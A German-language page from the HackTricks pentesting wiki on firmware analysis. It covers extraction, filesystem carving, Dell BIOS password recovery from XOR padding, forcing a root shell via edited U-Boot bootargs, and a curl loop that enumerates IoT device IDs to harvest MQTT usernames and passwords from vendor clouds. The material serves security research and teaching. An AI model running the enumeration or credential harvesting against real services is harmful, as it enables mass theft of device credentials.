# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

Informationen zur Beschaffung über freiliegende Hardwareschnittstellen finden Sie unter [Firmware-Dumping mithilfe einer UART-Konsole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) und [SPI-Flash-Dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Informationen zur wiederholbaren UART-Aufzeichnung während des Bootvorgangs, bevor der Zugriff auf die Konsole möglich ist, finden Sie unter [SCPI-gesteuerte Stromversorgung und Oszilloskop-Erfassung](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software verwaltet und erleichtert, mit der Benutzer interagieren. Sie wird in einem permanenten Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und anschließend das Betriebssystem startet. Die Untersuchung und mögliche Modifikation der Firmware ist ein wichtiger Schritt, um Sicherheitslücken zu identifizieren.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein wichtiger erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dabei werden Daten zu folgenden Aspekten zusammengetragen:

- Der CPU-Architektur und dem darauf ausgeführten Betriebssystem
- Details zum Bootloader
- Hardware-Layout und Datenblättern
- Codebasis-Metriken und Quellcode-Speicherorten
- Externen Bibliotheken und Lizenztypen
- Update-Verläufen und behördlichen Zertifizierungen
- Architektur- und Ablaufdiagrammen
- Sicherheitsbewertungen und identifizierten Sicherheitslücken

Dafür sind **Open-Source-Intelligence (OSINT)**-Tools äußerst nützlich, ebenso wie die Analyse verfügbarer Open-Source-Softwarekomponenten mithilfe manueller und automatisierter Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten eine kostenlose statische Analyse, mit der sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die jeweils unterschiedlich komplex sind:

- **Direkt** von der Quelle (Entwicklern, Herstellern)
- **Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Websites
- **Google-dork**-Suchanfragen verwenden, um gehostete Firmware-Dateien zu finden
- Direkt auf **Cloud-Speicher** zugreifen, beispielsweise mit [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Updates** mithilfe von Man-in-the-Middle-Techniken abfangen
- Firmware über Verbindungen wie **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) oder **PICit** aus dem Gerät **extrahieren**
- In der Gerätekommunikation nach Update-Anfragen **schnüffeln**
- **Fest codierte Update-Endpunkte** identifizieren und verwenden
- Firmware aus dem Bootloader oder über das Netzwerk **dumpen**
- Als letzte Möglichkeit den Speicherchip **ausbauen und auslesen**, wenn alle anderen Methoden scheitern; dazu geeignete Hardware-Tools verwenden

### Nur UART-Logs: Über die U-Boot-Umgebung im Flash eine Root-Shell erzwingen

Wenn UART RX ignoriert wird (nur Logs), können Sie dennoch eine Init-Shell erzwingen, indem Sie **den U-Boot-Umgebungs-Blob offline bearbeiten**:<sup>[[6]](#references)</sup>

1. SPI-Flash mit einem SOIC-8-Clip und einem Programmer auslesen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für den Blob neu**.
3. Schreibe nur die env-Partition neu und starte das Gerät neu; auf UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, deren Bootloader-Shell deaktiviert ist, deren env-Partition sich aber über externen Flash-Zugriff beschreiben lässt.

### Geschützten Code über einen Firewall-Kopierauftrag offenlegen

Bei manchen MCUs kann nicht geschützter Anwendungscode einen Gateway für geschützte Bereiche aufrufen, statt geschützten Flash direkt auszulesen. Nachdem du Anwendungscode ausführen kannst, untersuche jeden Gateway-Auftrag als separate Speicherübertragungsprimitive. Im Fall des Cypherock X1 akzeptierte das STM32L4-Firewall-Call-Gate einen Auftrag, einen externen `data`-Zeiger, eine Länge und eine geschützte `address`. Ein Schreibauftrag wies einen `data`-Quellzeiger in den Firewall Code nicht zurück. Der Aufrufer konnte diesen Code zwar nicht direkt lesen, doch das Gateway selbst konnte ihn in geschützten nichtflüchtigen Speicher kopieren, der über einen erlaubten Leseauftrag ausgelesen werden konnte.<sup>[[15]](#references)</sup>

Um diese Art der Offenlegung nachzustellen, identifiziere eine beschreibbare geschützte Speicherseite mit einem zugehörigen Leseauftrag, setze die Schreibquelle auf aufeinanderfolgende Adressen im geschützten Code und lies die zwischengespeicherten Bytes aus. Prüfe vor wiederholten Schreibvorgängen das Speichermedium: In diesem Fall war es Flash, daher musste eine Seite vor der erneuten Verwendung gelöscht werden. Die Forschenden verwendeten eine Routine, die den gültigen Inhalt des Secure Data Storage löschte und wiederherstellte. Anschließend legten sie Code im verbleibenden freien Speicherplatz ab, statt Wallet-Daten zu überschreiben. Dafür ist Codeausführung auf dem MCU und ein erreichbares Call-Gate erforderlich; es handelt sich nicht um eine direkte Leseumgehung über einen nicht authentifizierten Host.<sup>[[15]](#references)</sup>

Der wiederhergestellte Code kann [Lücken beim Vertrauen in Firmware-Updates und Boot-Integrität offenlegen](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Firmware analysieren

Nachdem du nun **über die Firmware verfügst**, musst du Informationen daraus extrahieren, um zu wissen, wie du damit umgehen sollst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, prüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **in der Firmware eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder verwende [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Rohe Display-Assets im externen Flash

Ein externer SPI-Dump enthält nicht zwangsläufig die ausführbare Firmware des MCU. Vergleiche bei einem Cortex-M-Ziel den Anfang jedes infrage kommenden Codebereichs mit der Speicherkarte des Geräts: Eine normale Vektortabelle beginnt mit einem plausiblen SRAM-Stackpointer und einer Reset-Handler-Adresse im ausführbaren Speicher. Eine fehlende Vektortabelle bei Offset null beweist allein nicht, dass der gesamte Chip keinen Code enthält; untersuche auch andere Offsets und die Boot-Konfiguration. Falls `binwalk` keinen Container findet, untersuche die Rohdaten und gleiche die Flash-Leseadressen aus einer [decodierten SPI-Aufzeichnung](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) mit den Aktionen ab, die neue Bildschirme laden.<sup>[[14]](#references)</sup>

Versuche bei einem Display-Asset-Bereich mögliche Pixelformate und Abmessungen, statt PNG/JPEG vorauszusetzen. Das zitierte Gerät verwendete Frames im Format **80×160 RGB565 little-endian**: Bei zwei Byte pro Pixel ist ein Frame **25.600 Byte** (25 KiB) groß, nicht 24 Kilobit. Eine decodierte Flash-Leseadresse identifizierte den Offset des Bildschirm-Assets. Der Forscher konvertierte ein vorbereitetes Bild mit `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, ersetzte das gleich große Asset im Original-Dump, schrieb es mit `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` und bestätigte das neue Bild auf dem Display. Dies demonstriert beschreibbare *externe Display-Assets*, nicht das Extrahieren oder erneute Flashen der internen Firmware des MCU. Bewahre den Original-Dump auf und überprüfe vor jedem Schreibvorgang Abmessungen, Byte-Reihenfolge, Offset und Länge des Ersatzinhalts.<sup>[[14]](#references)</sup>

### Differentielle Flash-Analyse und wiederherstellbare XOR-Geheimnisspeicher

Wenn für eine Firmware-Einstellung kein dokumentiertes Speicherformat existiert, lies zunächst mehrmals denselben Flash-Bereich aus, ändere **genau eine** Einstellung, erstelle erneut einen vollständigen Dump des Chips und vergleiche die Offsets. Durch Wiederholung des Experiments mit kontrollierten Werten lässt sich die Einstellung von Zählern und Schreibmetadaten unterscheiden. Änderungen an neuen statt an bestehenden Offsets weisen auf einen ausschließlich anhängenden oder protokollstrukturierten Speicher hin. Bewahre gelöschte oder tombstoned Einträge auf, da ihre Nutzdaten möglicherweise wiederherstellbar bleiben.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nachdem du die Region gefunden hast, extrahiere die Firmware-Module mit Tools wie `binwalk` und reverse-engineere den Writer/Validator in Ghidra. Bestätige Feldgrenzen, Padding, Schlüsselindizierung und Schlüsselableitung im Code, statt das Verfahren nur anhand von Chiffretextmustern abzuleiten.<sup>[[12]](#references)</sup>

#### Schlüssel aus verschlüsseltem Null-Padding wiederherstellen

Wie unter [XOR-basierte Verschlüsselung](../../crypto/symmetric/#xor-based-encryption) beschrieben, enthüllt bekannter Klartext die Keystream-Bytes an denselben Offsets. Ein Feld fester Größe ist besonders anfällig, wenn sein Null-Padding alle Indizes eines sich wiederholenden XOR-Schlüssels abdeckt: Das verschlüsselte Padding enthüllt diese Schlüsselbytes direkt, denn `0x00 XOR key_byte = key_byte`. Wenn alle Schlüsselindizes abgedeckt sind, rekonstruiere den Schlüssel anhand des Chiffretext-Endes und entschlüssele die belegten Bytes.<sup>[[12]](#references)</sup>

Dells anfälliges DVAR-BIOS-Passwortformat ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Feldes liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Schlüssel verwendet wird.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge `L` waren die Positionen `L..31` vor dem XOR null. Wenn `L <= 12` decken diese Positionen jeden Schlüsselindex ab, sodass der vollständige Schlüssel und das Passwort ohne Brute-Force wiederhergestellt werden:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen gewinnen

Analysiere nicht jeden Datensatz unabhängig. Der DVAR-Schlüssel wird ungefähr wie folgt abgeleitet: `modified_md5(device_seed || variable_GUID || password[0])`: Der Device Seed und die GUID sind fest, und die einzige passwortabhängige Eingabe ist das erste Klartext-Byte. Dadurch gibt es pro Gerät höchstens 256 Schlüssel, und Datensätze, die mit demselben Byte beginnen, verwenden denselben Schlüssel. Gruppiere aktive und gelöschte Datensätze nach diesem Byte. Ein kurzer historischer Datensatz kann über sein Padding den vollständigen Schlüssel preisgeben und so einen aktuellen, längeren Datensatz entschlüsseln, dessen eigenes Padding dafür nicht ausreicht. Ein Passwortwechsel kann die Offenlegung daher erhöhen, wenn alte Ciphertexte tombstoned statt gelöscht werden.<sup>[[12]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, gewinnt Passwörter zurück und kann rohe gespeicherte Schlüssel-Bytes anzeigen. Erstelle es aus einem Checkout und durchsuche ein verifiziertes Flash-Image wie folgt:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Bei benutzerdefinierten Parsern lassen sich False Positives anhand der Datensatzstruktur, Vorgaben für druckbare Zeichen, Prüfungen auf Nullauffüllung, Schlüsselentropie und Konsistenz beim Umlauf des Schlüssels verwerfen. Wenn wiederholte Dumps spärliche Bitänderungen pro Schreibvorgang zeigen, liste die beobachteten Masken auf und ordne mögliche Korrekturen anhand dieser Vorgaben. Gib jedoch mehrdeutige Zeichen an, statt heuristische Ergebnisse als exakte Wiederherstellung auszugeben.<sup>[[12]](#references)</sup>

Passwortverifizierer sollten statt umkehrbarem Chiffretext einen gesalzenen, iterierten Einweg-Hash speichern. Log-strukturierte Speicher sollten veraltetes geheimes Material sicher entfernen.<sup>[[12]](#references)</sup>

### Dateisystem abrufen

Mit den zuvor erwähnten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**. Üblicherweise ist das einer der folgenden: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal hat binwalk **die Magic Bytes des Dateisystems nicht in seinen Signaturen**. In diesen Fällen kannst du mit binwalk **den Offset des Dateisystems ermitteln und das komprimierte Dateisystem** aus der Binärdatei **herausschneiden**. Extrahiere das Dateisystem anschließend anhand seines Typs **manuell** und befolge dazu die nachstehenden Schritte.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führen Sie den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem zu extrahieren.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ könnte auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Aufteilen eingebetteter Root-Dateisysteme rekonstruieren

Wenn ein roher eMMC-/SSD-Dump einen gültigen Dateisystem-Header enthält, dessen Metadaten-Offsets jedoch über die nominelle Partition hinausreichen, sollte er nicht sofort als beschädigt eingestuft werden. Eingebetteter Boot-Code kann das tatsächliche Root-Gerät mithilfe von Device Mapper aus mehreren physischen Bereichen zusammensetzen. Daher enthält ein einzelnes GPT-Partitionsabbild nur das erste Segment.<sup>[[9]](#references)</sup>

#### Das vollständige Medienabbild prüfen

Stellen Sie zunächst sicher, dass die Erfassung abgeschlossen ist, die Größe stabil bleibt und kein Schreibprozess das Abbild noch geöffnet hält. Wenn der Dateiname eine Start-/Endadresse codiert, vergleichen Sie diesen Bereich mit der tatsächlichen Byteanzahl. Stellen Sie die GPT im schreibgeschützten Modus wieder her und binden Sie nur den erforderlichen Bereich ein. Führen Sie **nicht** `vgchange -ay` auf dem Workstation-Rechner für ein nicht vertrauenswürdiges physisches Volume aus, da es zu Konflikten zwischen Volume-Gruppen und unbeabsichtigten Schreibvorgängen kommen kann.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verwenden Sie eine Wegwerf-VM, wenn die ursprüngliche Init-Logik oder ein LVM-Stack das vollständige Image benötigt. Historische Boot-Logs einer Standard-Boot-Partition sind besonders nützlich: Der Bootloader hat möglicherweise proprietäre Container-Offsets, Komponentenlängen, Slot-Auswahl, Ausrichtungsregeln und Signaturprüfungen protokolliert. Verwenden Sie diese Werte, um eine eingebettete Kommandozeile, einen Kernel und ein Initramfs herauszulösen, und validieren Sie jede Ausgabe unabhängig mit `file`, Magic Bytes und `binwalk`; beim Lesen bis zum Ende des Containers können versehentlich ein initrd, ein ACPI-Objekt oder eine Signatur an den Kernel angehängt werden.<sup>[[9]](#references)</sup>

#### Die Blockzuordnung zur Boot-Zeit wiederherstellen

Extrahieren Sie das Initramfs des Kernels und analysieren Sie dessen `/init` sowie alle Speicherbibliotheken rückwärts. Folgen Sie in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) den String-Referenzen für `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` und Partitionspfade; verfolgen Sie anschließend den Code, der den aktiven A/B-Slot auswählt und die Tabelle erstellt. Nützliche Einstiegspunkte für radare2 sind `r2 -A init`, `afl`, `pdf @ main` und `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Das linear target ordnet aufeinanderfolgende Bereiche eines virtuellen Geräts Bereichen eines oder mehrerer zugrunde liegender Geräte zu. Eine rekonstruierte Tabelle mit zwei Segmenten hat häufig folgende Form (alle Positionen und Längen sind 512-Byte-Sektoren):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduziert die arithmetischen Operationen des Maschinencodes exakt, einschließlich Integer-Breite, Shifts und Einheitenumrechnungen. Der folgende Ausdruck rundet beispielsweise eine Byte-Größe auf eine 4-KiB-Grenze ab und rechnet sie erst dann in 512-Byte-Sektoren um; ersetzt man ihn durch `p4_bytes // 512`, verschiebt sich das ausgewählte Ende um `p4_bytes % 4096`, wenn die Partition nicht an einer Seitengrenze ausgerichtet ist.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ein flaches Analyse-Image lässt sich rekonstruieren, indem die Bereiche in Tabellenreihenfolge mit begrenzten Blöcken kopiert werden, statt den vollständigen Media-Dump in den Arbeitsspeicher zu laden. Dadurch werden auch hostseitige Mapper-Geräte vermieden. Die aus der GPT abgeleiteten Offsets, die umgekehrten Sektoranzahlen und die resultierende Ausgabelänge sollten als separate Assertions behandelt werden.<sup>[[9]](#references)</sup>

#### Beschädigung von einem konstanten Rekonstruktionsfehler unterscheiden

Prüfe bei SquashFS vor dem Ausführen von `unsquashfs` die `hsqs`-Magic und dekodiere das little-endian 64-Bit-Feld `bytes_used` am Superblock-Offset 40. Wenn die Extraktion in mehreren unabhängigen Strukturen fehlschlägt, durchsuche ein breites Fenster um die erwarteten Positionen und verlange starke strukturelle Kandidaten: einen dekomprimierbaren Metadatenblock, mehrere aufeinanderfolgende gültige Verzeichniseinträge, plausible Inode-Felder, einen Root-Inode, der zur Inode-Anzahl passt, oder eine gültige Integritätsmetadatenstruktur. Ein einzelner Magic-Treffer reicht nicht aus.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wenn dieselbe signierte Differenz unabhängige Strukturen gültig macht – zum Beispiel Verzeichnis-Metadaten und einen Verity-Datensatz –, liegt die wahrscheinliche Ursache in einem systematischen Fehler beim Segmentstart und nicht in fehlenden Bytes. Kehre zur umgekehrten Berechnung zurück und suche nach verworfenen Resten, falscher Vorzeichenbehandlung, Überläufen oder Sektor-/Seitenausrichtung, bevor du versuchst, verwaiste Daten wiederherzustellen oder Dateisystem-Metadaten zu patchen.<sup>[[9]](#references)</sup>

Halte schließlich die Schutzgrenzen getrennt: TPM-versiegelte LUKS-Volumes schützen die Vertraulichkeit der Daten, während ein signiertes dm-verity-Mapping die Integrität des Root-Dateisystems schützt. Ein Software-TPM kann keinen Schlüssel wiederherstellen, der an das ursprüngliche physische TPM gebunden ist. Das Booten eines modifizierten SquashFS über ein Init, das nur zu Forschungszwecken die Verity-Prüfung auslässt, fälscht weder dessen Signatur noch bricht es dm-verity.<sup>[[9]](#references)</sup>

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu zerlegen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dabei kommen verschiedene Tools zum Einsatz, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Erste Analysetools

Für die erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) stehen verschiedene Befehle zur Verfügung. Sie helfen dabei, Dateitypen zu bestimmen, Strings zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu ermitteln:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung schließen lässt.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation zu **file-data-carving-recovery-tools** und **binvis.io** zur Dateiuntersuchung empfohlen.

### Dateisystem extrahieren

Mit `binwalk -ev <bin>` lässt sich das Dateisystem normalerweise extrahieren, häufig in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Erkennt **binwalk** den Dateisystemtyp aufgrund fehlender Magic Bytes jedoch nicht, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend mit dem Befehl `dd` das Dateisystem herausgeschnitten:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Danach werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) verschiedene Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Anmeldedaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

Zu den **wichtigen Speicherorten** und **Elementen**, die überprüft werden sollten, gehören:

- **etc/shadow** und **etc/passwd** für Benutzeranmeldedaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binärdateien für weitere Analysen
- Gängige Webserver und Binärdateien von IoT-Geräten

Mehrere Tools helfen dabei, vertrauliche Informationen und Schwachstellen im Dateisystem aufzuspüren:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zum Suchen nach vertraulichen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analysen
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl der Quellcode als auch die im Dateisystem gefundenen kompilierten Binärdateien müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Anmeldedaten über abgeleitete URL-Tokens auslesen

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse findest du möglicherweise heraus, dass `<token>` lokal aus der Geräte-ID und einem fest codierten Geheimnis abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Durch dieses Design kann jeder, der eine deviceId und den STATIC_KEY kennt, die URL rekonstruieren und die Cloud-Konfiguration abrufen. Darin finden sich oft MQTT-Anmeldedaten im Klartext und Topic-Präfixe.

Praktischer Ablauf:

1) deviceId aus UART-Boot-Logs extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Logs aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suche nach Zeilen, die das URL-Muster der Cloud-Konfiguration und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder nach der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Berechne den Token in Bash und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten sammeln

- URL zusammenstellen und JSON mit curl abrufen; mit jq analysieren, um Secrets zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Klartext-MQTT und schwache Topic-ACLs missbrauchen (falls vorhanden)

- Verwende wiederhergestellte Zugangsdaten, um Maintenance-Topics zu abonnieren und nach sensiblen Ereignissen zu suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs systematisch auflisten (in großem Umfang, mit Genehmigung)

- Viele Ökosysteme verwenden Bytes für Hersteller-OUI, Produkt und Typ, gefolgt von einem sequenziellen Suffix.
- Du kannst mögliche IDs durchlaufen, Tokens ableiten und Configs programmatisch abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du mit der Massenerfassung beginnst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Geheimnisse wiederherzustellen, ohne die Zielhardware zu verändern.


Die Emulation von Firmware ermöglicht eine **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Bei diesem Ansatz können Herausforderungen durch Abhängigkeiten von Hardware oder Architektur auftreten. Das Übertragen des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Byte-Reihenfolge, etwa einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests ermöglichen.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Byte-Reihenfolge und die CPU-Architektur des Programms zu ermitteln.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für die MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationswerkzeuge zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet; für Little-Endian-Binärdateien ist `qemu-mipsel` die passende Wahl.

#### ARM-Architekturemulation

Bei ARM-Binärdateien ist der Prozess ähnlich; zur Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

